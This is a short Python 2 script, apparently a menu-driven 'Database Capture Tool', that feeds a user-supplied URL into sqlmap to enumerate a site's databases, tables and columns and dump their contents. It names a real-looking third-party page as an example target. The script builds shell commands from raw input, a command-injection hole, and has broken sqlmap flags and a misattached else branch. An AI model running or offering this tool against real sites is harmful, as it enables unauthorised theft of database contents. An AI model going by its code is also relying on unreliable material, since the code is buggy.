#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os


os.system("apt-get install figlet")
os.system("clear")
os.system("figlet DATA")
print("""
Welcome to the Database Capture Tool.

1) I only know the open link.
2) Annotated Link, I know the Database Name.
3) I know the Open Link, Database Name, Table Name.
4) I know the Open Link, Database Name, Table Name, Colon Name.

Example with Explicit Link: http://www.suesupriano.com/articale.php?id=25

""")

islemno = raw_input("Please Enter A Number Value For Operation: ")
if(islemno == "1"):
	aciklink = raw_input("Enter the Revealed Link: ")
	os.system("sqlmap -u " + aciklink + " -dbs --tables --randomagent")

if(islemno == "2"):
	aciklink = raw_input("Enter the Revealed Link: ")
	veritabani = raw_input("Enter the Database Name: ")
	os.system("sqlmap -u " + aciklink + " -D " + veritabani + " --tables --randomagent")

if(islemno == "3"):
	aciklink = raw_input("Enter the Revealed Link: ")
	veritabani = raw_input("Enter the Database Name: ")
	tablo = raw_input("Enter Table Name: ")
	os.system("sqlmap -u " + aciklink + " -D " + veritabani + " -T " + tablo + " --colunns --random-agent")

if(islemno == "4"):
	aciklink = raw_input("Enter the Revealed Link: ")
	veritabani = raw_input("Enter the Database Name: ")
	tablo = raw_input("Enter Table Name: ")
	colon = raw_input("Enter Colon Name: ")
	os.system("sqlmap -u " + aciklink + " -D " + veritabani + " -T " + tablo + " -C " + colon + " --dump --random-agent")

else:
	print("\033[92mYou entered an incorrect number value. Vehicle is Restarting..")
	os.system("python data.py")
